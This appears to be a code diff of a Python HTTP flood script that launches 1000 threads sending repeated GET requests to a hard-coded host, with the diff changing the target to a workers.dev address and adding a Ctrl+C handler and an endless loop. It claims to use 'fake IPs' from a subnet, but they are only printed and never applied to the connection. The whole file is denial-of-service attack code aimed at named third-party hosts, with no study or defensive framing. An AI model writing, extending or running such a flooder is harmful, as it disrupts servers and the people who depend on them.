@@ -2,9 +2,12 @@ import socket
 import random
 import threading
 import ipaddress
+import time
+import signal
+import sys
 
 # Define the target server and port
-target = "axlinesid.site"
+target = "sxtcp.tg-index.workers.dev"
 port = 80  # HTTP typically uses port 80
 
 # Define the CIDR subnet range
@@ -22,7 +25,7 @@ def generate_fake_ips(subnet, count):
     return fake_ips
 
 # Generate fake IPs within the CIDR range
-generated_fake_ips = generate_fake_ips(subnet, 101)  
+generated_fake_ips = generate_fake_ips(subnet, 100)
 
 # Function to send HTTP GET requests with a random fake IP
 def send_request_with_random_fake_ip():
@@ -35,7 +38,12 @@ def send_request_with_random_fake_ip():
             s.connect((target, port))
             s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
             s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
+            
+            # Receive and discard the response
+            response = s.recv(1000)
+            
             s.close()
+            
             print(f"Sent request with fake IP: {fake_ip}")
         except Exception as e:
             print("An error occurred:", str(e))
@@ -47,6 +55,17 @@ for _ in range(1000):
     thread.start()
     threads.append(thread)
 
-# Wait for all threads to finish (you can modify this logic as needed)
-for thread in threads:
-    thread.join()
+# Function to handle SIGINT signal (Ctrl+C)
+def signal_handler(sig, frame):
+    print("Stopping the program...")
+    # Wait for all threads to finish
+    for thread in threads:
+        thread.join()
+    sys.exit(0)
+
+# Register the signal handler
+signal.signal(signal.SIGINT, signal_handler)
+
+# Keep the program running
+while True:
+    time.sleep(0000000.1)
